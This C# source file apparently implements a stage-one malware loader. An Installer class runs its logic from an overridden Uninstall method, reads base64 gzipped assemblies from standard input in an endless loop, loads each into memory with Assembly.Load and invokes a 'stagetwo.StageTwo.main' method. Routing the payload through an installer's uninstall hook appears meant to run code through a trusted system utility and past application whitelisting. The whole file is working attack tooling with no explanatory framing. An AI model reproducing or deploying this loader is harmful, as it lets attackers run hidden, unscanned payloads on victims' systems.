﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace loader
{
	[System.ComponentModel.RunInstaller(true)]
	public class Loader : System.Configuration.Install.Installer
	{
		public override void Uninstall(System.Collections.IDictionary savedState)
		{
			base.Uninstall(savedState);

			System.Console.WriteLine("READY");

			while (true)
			{
				try
				{
					String encoded = System.Console.ReadLine();
					var compressed = System.Convert.FromBase64String(encoded);
					var ms = new System.IO.MemoryStream(compressed);
					var gz = new System.IO.Compression.GZipStream(ms, System.IO.Compression.CompressionMode.Decompress);
					var output_ms = new System.IO.MemoryStream();
					gz.CopyTo(output_ms);
					var assembly = System.Reflection.Assembly.Load(output_ms.ToArray());
					var stagetwo = assembly.CreateInstance("stagetwo.StageTwo");
					stagetwo.GetType().GetMethod("main").Invoke(stagetwo, new object[] { });
				} catch ( Exception e )
                {
					System.Console.WriteLine("UH-OH");
					System.Console.WriteLine(e.Message);
                }
			}
		}
	}

}
